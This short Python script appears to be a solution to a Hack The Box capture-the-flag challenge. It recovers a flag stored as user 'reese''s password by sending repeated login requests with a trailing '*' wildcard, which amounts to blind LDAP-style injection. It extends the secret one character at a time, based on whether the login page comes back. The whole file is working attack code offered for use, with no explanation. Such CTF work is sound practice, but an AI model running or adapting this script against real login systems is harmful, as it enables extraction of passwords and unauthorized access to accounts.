import string
import requests
import sys

charset = string.ascii_letters + string.digits + "@#$%^&_-"
username = 'reese'
password = 'HTB{d1rectory'

while True:
    is_end = True
    for c in charset:
        r = requests.post(f'http://{sys.argv[1]}/login', {
            "username": "reese",
            "password": password + c + '*}',
        })
        if 'Login' not in r.text:
            password += c
            is_end = False
            print(password)
            break
    if is_end:
        break